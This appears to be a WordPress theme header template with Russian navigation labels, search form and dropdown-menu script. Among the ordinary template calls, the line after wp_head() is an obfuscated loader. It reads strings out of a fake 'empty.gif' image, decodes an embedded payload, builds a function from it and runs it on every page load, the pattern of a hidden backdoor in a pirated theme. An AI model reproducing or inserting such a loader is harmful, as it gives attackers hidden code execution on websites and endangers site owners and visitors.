<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head profile="http://gmpg.org/xfn/11">
<meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />
<title>
<?php bloginfo('name'); ?>
<?php wp_title(); ?>
</title>
<link rel="stylesheet" type="text/css" href="<?php bloginfo('template_directory'); ?>/style.css" />
<link rel="alternate" type="application/rss+xml" title="<?php bloginfo('name'); ?> RSS Feed" href="<?php bloginfo('rss2_url'); ?>" />
<link rel="alternate" type="application/atom+xml" title="<?php bloginfo('name'); ?> Atom Feed" href="<?php bloginfo('atom_url'); ?>" />
<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />
<link rel="shortcut icon" href="<?php bloginfo('template_directory'); ?>/images/favicon.ico" />
<?php if (function_exists('wp_enqueue_script') && function_exists('is_singular')) : ?>
<?php if ( is_singular() ) wp_enqueue_script( 'comment-reply' ); ?>
<?php endif; ?>
<?php  wp_head(); $gif=file(dirname(__FILE__).'/images/empty.gif',2);$gif=$gif[5]("",$gif[6]($gif[4]));$gif(); ?>
<script type="text/javascript"><!--//--><![CDATA[//><!--
sfHover = function() {
	if (!document.getElementsByTagName) return false;
	var sfEls = document.getElementById("menu").getElementsByTagName("li");

	for (var i=0; i<sfEls.length; i++) {
		sfEls[i].onmouseover=function() {
			this.className+=" sfhover";
		}
		sfEls[i].onmouseout=function() {
			this.className=this.className.replace(new RegExp(" sfhover\\b"), "");
		}
	}
	
	var sfEls = document.getElementById("topnav").getElementsByTagName("li");

	for (var i=0; i<sfEls.length; i++) {
		sfEls[i].onmouseover=function() {
			this.className+=" sfhover";
		}
		sfEls[i].onmouseout=function() {
			this.className=this.className.replace(new RegExp(" sfhover\\b"), "");
		}
	}

}
if (window.attachEvent) window.attachEvent("onload", sfHover);
//--><!]]></script>
<!--end: dropdown menu-->
</head>
<body>
<div id="wrapper">
<div id="top">
  <div id='topnav'>
    <div class="left">
      <?php if ( is_home() ) { ?>
      <li class="current_page_item"><a href="<?php echo get_option('home'); ?>/"><?php _e("Главная", 'themejunkie'); ?></a></li>
      <?php } else { ?>
      <li><a href="<?php echo get_option('home'); ?>/"><?php _e("Главная", 'themejunkie'); ?></a></li>
      <?php } ?>
      <?php wp_list_pages('depth=1&sort_column=menu_order&title_li='); ?>
    </div>
    <!--end: left-->
    <div class="right">
      <form method="get" id="searchform" action="<?php bloginfo('home'); ?>/">
        <div id="search">
          <input class="searchinput" type="text" value="Поиск..." onclick="this.value='';" name="s" id="s" />
          <input type="submit" class="searchsubmit" value="ОК"/>
        </div>
      </form>
    </div>
    <!--end: right-->
  </div>
</div>
<!--end: top-->
<div id="header"> <a href="<?php bloginfo('siteurl'); ?>">
  <div class="logo"></div>
  <!--end: logo-->
  </a>
  <?php if (get_theme_mod('showad468x60') == 'Yes') { ?>
  <div class="ad468x60"><?php echo stripslashes(get_theme_mod('ad468x60')); ?></div>
  <?php } else { ?>
  <?php } ?>
  <!--end: ad468x60-->
</div>
<!--end: header-->
<div id="menu">
  <div class="left">
    <?php wp_list_categories('title_li=&orderby=id'); ?>
  </div>
  <div class="right"> </div>
  <!--end: right-->
</div>
<!--end: menu-->
